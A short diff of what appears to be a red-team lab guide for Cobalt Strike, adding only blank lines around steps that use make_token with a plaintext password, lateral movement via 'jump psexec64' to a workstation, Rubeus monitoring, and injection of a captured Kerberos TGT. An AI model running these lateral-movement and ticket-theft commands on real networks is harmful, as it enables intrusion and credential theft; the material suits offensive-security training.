@@ -10,6 +10,7 @@
     
     2.  make_token CONTOSO\rsteel Passw0rd!
     3.  jump psexec64 lon-ws-1 smb
+
 -  Run Rubeus in monitor mode on _lon-ws-1_.
     
     BeaconTypeCopy
@@ -22,6 +23,7 @@
     
     1. jobs
     2. jobkill 0
+
 -  Inject the captured TGT into a sacrificial logon session.
     
     BeaconTypeCopy
